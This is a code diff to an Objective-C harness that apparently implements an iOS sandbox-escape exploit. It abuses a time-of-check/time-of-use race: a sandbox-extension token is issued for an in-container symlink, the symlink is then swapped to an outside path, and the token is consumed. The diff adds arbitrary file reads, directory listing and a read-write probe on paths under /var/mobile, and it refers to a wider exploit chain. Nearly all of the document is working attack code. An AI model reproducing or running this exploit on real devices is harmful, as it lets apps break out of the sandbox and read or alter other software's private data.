@@ -33,6 +33,7 @@
 
 #import <Foundation/Foundation.h>
 #import <dlfcn.h>
+#import <dirent.h>
 #import <fcntl.h>
 #import <unistd.h>
 #import <mach/mach.h>
@@ -40,7 +41,7 @@
 #import <stdio.h>
 #import <string.h>
 
-#define P116_BUILD @"p116-sandboxext-toctou-v1"
+#define P116_BUILD @"p116-sandboxext-toctou-v2-path-dir-rw"
 
 static NSMutableString *g_log = nil;
 static int g_fd = -1;
@@ -105,6 +106,68 @@ static long p116_read(const char *outPath, const char *s, const char *l, FILE *l
     return total > 0 ? total : 0;
 }
 
+/* v2: directory listing through the same TOCTOU. The in-container path s must
+   be a DIRECTORY (p116_work/d); the token is issued for the symlink to d, then
+   the symlink is swapped to outDir and the token consumed. Read-only. */
+static int p116_list_dir(const char *outDir, const char *s, const char *l, int maxEnt) {
+    unlink(l);
+    if (symlink(s, l) != 0) return -1;
+    char *tok = g_issue("com.apple.app-sandbox.read", l, 0);
+    if (!tok) return -1;
+    unlink(l);
+    if (symlink(outDir, l) != 0) {
+        memset(tok, 0, strlen(tok)); free(tok); return -1;
+    }
+    int64_t h = g_consume(tok);
+    memset(tok, 0, strlen(tok));
+    free(tok);
+    if (h <= 0) return -1;
+    int n = 0;
+    DIR *d = opendir(l);
+    if (d) {
+        struct dirent *e;
+        while ((e = readdir(d)) != NULL && n < maxEnt) {
+            if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
+            Lf(@"    dir: %s", e->d_name);
+            n++;
+        }
+        closedir(d);
+    }
+    if (g_release) g_release(h);
+    return n;
+}
+
+/* v2: read-write test through the same TOCTOU. The token is issued with
+   com.apple.app-sandbox.read-write for an in-container file, the symlink is
+   swapped to a mobile-owned target, and the target is opened O_CREAT/written.
+   The caller should keep the target under /var/mobile (daemon caches are the
+   interesting class; never /etc, /System, launchd, keychain). Tokens are never
+   logged. */
+static long p116_write_test(const char *outPath, const char *s, const char *l) {
+    unlink(l);
+    if (symlink(s, l) != 0) return -1;
+    char *tok = g_issue("com.apple.app-sandbox.read-write", l, 0);
+    if (!tok) return -1;
+    unlink(l);
+    if (symlink(outPath, l) != 0) {
+        memset(tok, 0, strlen(tok)); free(tok); return -1;
+    }
+    int64_t h = g_consume(tok);
+    memset(tok, 0, strlen(tok));
+    free(tok);
+    if (h <= 0) return -1;
+    int fd = open(l, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    long wrote = -1;
+    if (fd >= 0) {
+        const char *msg = "p116 rw probe\n";
+        ssize_t w = write(fd, msg, strlen(msg));
+        if (w > 0) { fsync(fd); wrote = (long)w; }
+        close(fd);
+    }
+    if (g_release) g_release(h);
+    return wrote;
+}
+
 @implementation P116SandboxExtTocTou
 
 + (NSString *)tap {
@@ -128,6 +191,8 @@ static long p116_read(const char *outPath, const char *s, const char *l, FILE *l
     L(@"[not-elevate] userspace sandbox file-read. Not uid0, not CS_PLATFORM,");
     L(@"  not kread32. AfterKread elevate stays gated on hasKread.");
     L(@"  KERNEL / Full Chain do not auto-fire this as a privilege step.");
+    L(@"[v2] knobs: Documents/p116_path.txt (single read), p116_dir.txt (list),");
+    L(@"  p116_rw_path.txt (read-write probe; /var/mobile only). Tokens never logged.");
 
     g_issue   = (p116_issue_t)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
     g_consume = (p116_consume_t)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
@@ -151,6 +216,44 @@ static long p116_read(const char *outPath, const char *s, const char *l, FILE *l
         long c = p116_read(s, s, l, NULL);
         Lf(@"[CONTROL] in-container  bytes=%ld (%@)", c,
            c > 0 ? @"harness ALIVE" : @"harness DEAD — all verdicts VOID");
+
+        /* v2 knobs: arbitrary read, directory list, safe read-write probe. */
+        {
+            NSString *p = [[NSString stringWithContentsOfFile:
+                [docs stringByAppendingPathComponent:@"p116_path.txt"]
+                encoding:NSUTF8StringEncoding error:nil]
+                stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            if (p.length) {
+                long got = p116_read(p.UTF8String, s, l, NULL);
+                Lf(@"[v2] path read: %@ — %ld bytes", p, got);
+            }
+            NSString *dr = [[NSString stringWithContentsOfFile:
+                [docs stringByAppendingPathComponent:@"p116_dir.txt"]
+                encoding:NSUTF8StringEncoding error:nil]
+                stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            if (dr.length) {
+                NSString *d = [tmp stringByAppendingPathComponent:@"d"];
+                [[NSFileManager defaultManager] createDirectoryAtPath:d
+                                          withIntermediateDirectories:YES attributes:nil error:nil];
+                int n = p116_list_dir(dr.UTF8String, d.UTF8String, l, 128);
+                Lf(@"[v2] dir list %@ — %d entries", dr, n);
+            }
+            NSString *rw = [[NSString stringWithContentsOfFile:
+                [docs stringByAppendingPathComponent:@"p116_rw_path.txt"]
+                encoding:NSUTF8StringEncoding error:nil]
+                stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            if (!rw.length) rw = @"/var/mobile/Library/Caches/p116_rw_probe.txt";
+            if (!([rw hasPrefix:@"/var/mobile/"] || [rw hasPrefix:@"/private/var/mobile/"])) {
+                Lf(@"[v2] rw refused: %@ (target must be under /var/mobile)", rw);
+            } else {
+                long w = p116_write_test(rw.UTF8String, s, l);
+                Lf(@"[v2] rw %@ — write=%ld", rw, w);
+                if (w > 0) {
+                    long rb = p116_read(rw.UTF8String, s, l, NULL);
+                    Lf(@"[v2] rw readback %ld bytes", rb);
+                }
+            }
+        }
 
         /* the writeup's target list + three fleet extras */
         struct { const char *p; } targets[] = {
